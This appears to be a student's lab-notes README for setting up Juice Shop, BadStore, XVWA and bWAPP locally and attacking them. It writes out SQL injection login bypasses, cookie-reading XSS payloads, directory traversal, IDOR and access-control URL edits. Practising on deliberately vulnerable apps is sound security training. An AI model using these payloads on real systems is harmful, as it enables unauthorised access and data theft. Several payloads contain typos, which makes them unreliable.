# mikeryan_vuln

install docker 

https://docs.docker.com/engine/install/debian/

sudo docker ps [to view running docker process]

[if there is an error like docker already running 

then run command 
sudo docker stop (container_name)
if required 
sudo docker rm (conatiner_name) ]


1) Juice Shop 

	install docker 

	sudo docker pull bkimminich/juice-shop

	sudo docker run -d -p 3000:3000 --name juice-shop bkimminich/juice-shop

	http://localhost:3000



Vulnerability 

	1) in url add: 
 	    localhost:3000/#/administration

	2) inside login 
	for username give 'OR 1=1-- and password anything

	3) go to inspect
	 add script inside div tag class="cdk-live-announcer-eleme cdk-visually-hidden"
	<img rc="invalid_image" onerror="alert('XSS')">

	4) Directory Traversal 
	http://localhost:3000/ftp

	5) Information Disclosure (API Data)
	curl -X POST http://localhost:3000/api/export-data -d "user_id=1234"

	info got in output

	Framework Info:Express.js
	Third-Party Libraries: Libraries like morgan
	File Paths and Line Numbers: Exposes internal paths, such as 
	/juice-shop/build/routes/angular.js, revealing where the error occurred in the 
	app.
	

if required
	sudo docker stop juice-shop
	sudo docker rm juice-shop



2) BadStore

	sudo docker pull jvhoof/badstore-docker

	sudo docker run -d -p 80:80 jvhoof/badstore-docker

	http://localhost

vulnerability 

     1) in search bar add 

        <script>alert('XSS')</script>

         you will get xss

	2)  in search bar add
	<script>alert(0)</script>
 
	you will get pop up showing reflected XSs

	3) in supplier login 
	within email address add payload 

	1’ or ‘1’=’1-- -  
	or 
	admin

	you will be able to login as a supplier 

	3) Click on supplier contract and it will download the contract without you being 	an authenticated supplier ie. you have not logged in as supplier yet 

	4) in browser url add

	http://localhost/cgi-bin/badstore.cgi?action=admin

	u will directly log in as admin and showing BAC

	5)  in terminal , information disclosure for server used

	curl -I http://localhost/cgi-bin/badstore.cgi

	6) SQL injection , found all available products 
	http://localhost/cgi-bin/badstore.cgi?action=search&search&query=1'OR'1'='1





3) XVWA


download iso file 
https://www.vulnhub.com/entry/xtreme-vulnerable-web-application-xvwa-1,209/


run the iso file on vm ware 
once open xvwa 

ifconfig on xvwa machine 

using that ip , on kali browser
do 
http://192.168.71.132/xvwa/


vulnerability 

	1) server side template injection 

	there add <script>alert(0)</script>

	2) in sql injection 

	add in search 1 or ' , and submit it will give error based output (reason upto)

	3) insecure object reference 

	in url item=some one number in range 1 to 5 
	but we give more than 5 still it take as input and display output 
	so first select item and submit , then change url 

	http://192.168.71.132/xvwa/vulnerabilities/idor/?item=7

	4) created a vulnerable payload using gedit or nano (eg add script to it)

	go to unrestricted file upload and upload image 
	no intput sanitisation 

	5) login using username pass admin and admin 
	then go to missing access control and you can delete select options

	then logout 
	and again go to missing access control there select an option 
	click on view 
	and on url change action=view to action=delete



4) BWAPP


docker pull raesene/bwapp

docker run -d -p 8080:80 raesene/bwapp

in browser 

http://localhost:8080/install.php

Login to bwapp
Username:bee
Password:bug

Find the vulnerabilities

	1) Sql injection(get search)

	‘OR 1==1—
	click search you will get , error based , click search again 

	2) Cross site scripting

	Select html injection (reflected)
	
	Then in frst and last name u add payload
	First name=<script>alert(document.cookie);</script>
	Last name=<img src=x onerror=alert(document.cookie)>
	Right click on page – view source page [check for script you have injected]

	3) information disclosure
	Select information disclosure-php version

	4) curl -I http://localhost:8080/login.php

	5) directory traversal-
	directories u select under a7 and press hack
	http://localhost:8080/directory_traversal_2.php?directory=documents
	
	remove documents and add =../
	Payload=http://localhost:8080/directory_traversal_2.php?directory=../

	6) oldbackup and unreferred file under a5
	
	Just change the url
	localhost:8080/sm_obu_files.php
	smo_obu_files.php change to backdoor.php

	





	 


                         

